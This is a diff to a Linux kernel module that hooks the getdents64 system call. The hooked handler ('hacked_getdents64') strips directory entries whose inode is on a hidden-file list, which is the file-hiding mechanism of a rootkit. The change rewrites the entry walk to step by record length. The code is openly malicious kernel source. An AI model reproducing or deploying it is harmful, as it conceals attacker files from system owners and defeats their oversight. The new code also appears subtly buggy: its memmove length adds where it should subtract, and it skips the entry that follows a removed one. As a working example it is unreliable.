@@ -143,9 +143,10 @@ getdents64_ptr orig_getdents64;
 asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                  unsigned int count)
 {
-	int actual_result, hacked_result, number_dirps, i;
+	int actual_result, hacked_result, bp;
 	struct hidden_file *ptr;
-	struct linux_dirent64 *kdirp;
+	char *kdirp; // char buffer so we can do pointer arithmetic by byte
+	struct linux_dirent64 *d;
 
 	printk(KERN_INFO "Running hacked_getdents64\n");
 
@@ -156,27 +157,28 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,count))
 		return -1;
-	if ((kdirp = kmalloc(count,GFP_KERNEL)) == NULL)
+	if ((kdirp = kmalloc(actual_result,GFP_KERNEL)) == NULL)
 		return -1;
-	if (copy_from_user(kdirp,dirp,count))
+	if (copy_from_user(kdirp,dirp,actual_result))
 		return -1;
 
 	// check result for files to hide
 	if (actual_result > 0) { // actually read some bytes
 		printk(KERN_INFO "Checking dirp\n");
-		number_dirps = actual_result / sizeof(struct linux_dirent64);
-		for (i = 0; i < number_dirps; i++) {
-			printk(KERN_INFO "How many dirps? %i, %i\n",i,number_dirps);
+		for (bp = 0; bp < actual_result;) {
+			//printk(KERN_INFO "How many dirps? %i, %i\n",i,number_dirps);
+			d = (struct linux_dirent64 *) (kdirp + bp);
 			list_for_each_entry(ptr,&hidden_files,list) {
-				printk(KERN_INFO "Current inode: %llu\n", (kdirp + i)->d_ino);
-				printk(KERN_INFO "Saved inode: %llu\n", ptr->inode);
-				if ((kdirp + i)->d_ino == ptr->inode) {
+				//printk(KERN_INFO "Current inode: %llu\n", (kdirp + i)->d_ino);
+				//printk(KERN_INFO "Saved inode: %llu\n", ptr->inode);
+				if (d->d_ino == ptr->inode) {
 					printk(KERN_INFO "Found file to hide\n");
-					memmove(kdirp + i,kdirp + i + 1,
-					       sizeof(struct linux_dirent64)*(number_dirps-i-1));
-					hacked_result -= sizeof(struct linux_dirent64);
+					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+					        actual_result - bp + d->d_reclen);
+					hacked_result -= d->d_reclen;
 				}
 			}
+			bp += d->d_reclen;
 		}
 	}
 
